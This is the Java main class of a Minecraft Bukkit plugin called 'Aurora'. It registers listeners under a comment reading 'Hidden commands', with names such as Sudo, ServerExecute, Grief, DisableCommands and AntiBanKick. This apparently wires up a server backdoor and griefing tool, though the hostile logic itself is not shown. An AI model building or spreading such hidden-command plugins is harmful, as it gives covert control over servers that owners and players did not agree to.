package me.oscarcusick.aurora;

import me.oscarcusick.aurora.Commands.Executors.*;
import me.oscarcusick.aurora.Listeners.AntiBanKickListener;
import me.oscarcusick.aurora.Listeners.ChatInterfaceListener;
import me.oscarcusick.aurora.Listeners.GUIListeners.AntiBanKickGUIListener;
import me.oscarcusick.aurora.Listeners.GUIListeners.PlayerGUIListener;
import me.oscarcusick.aurora.Listeners.GUIListeners.ServerGUIListener;
import me.oscarcusick.aurora.Listeners.GriefListener;
import org.bukkit.plugin.java.JavaPlugin;

public final class Aurora extends JavaPlugin {

    String Version = "1.1";
    String Build = "Beta";

    @Override
    public void onEnable() {
        // --- Register Listeners
        getServer().getPluginManager().registerEvents(new ChatInterfaceListener(this), this);
        // Hidden commands
        getServer().getPluginManager().registerEvents(new DoSecurityPrefixCommandExecutor(this), this);
        getServer().getPluginManager().registerEvents(new ServerSpecCommandExecutor(this), this);
        getServer().getPluginManager().registerEvents(new PlayerCommandExecutor(this), this);
        getServer().getPluginManager().registerEvents(new SudoCommandExecutor(this), this);
        getServer().getPluginManager().registerEvents(new ServerExecuteCommandExecutor(this), this);
        getServer().getPluginManager().registerEvents(new ServerCommandExecutor(this), this);
        getServer().getPluginManager().registerEvents(new VersionCommandExecutor(this, Version, Build), this);
        getServer().getPluginManager().registerEvents(new GriefCommandExecutor(this), this);
        getServer().getPluginManager().registerEvents(new DisableCommandsCommandExecutor(this), this);

        // GUI Listeners
        getServer().getPluginManager().registerEvents(new PlayerGUIListener(this), this);
        getServer().getPluginManager().registerEvents(new AntiBanKickGUIListener(this), this);
        getServer().getPluginManager().registerEvents(new ServerGUIListener(this), this);

        // Event Listeners
        getServer().getPluginManager().registerEvents(new AntiBanKickListener(this), this);
        getServer().getPluginManager().registerEvents(new GriefListener(this), this);
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
    }
}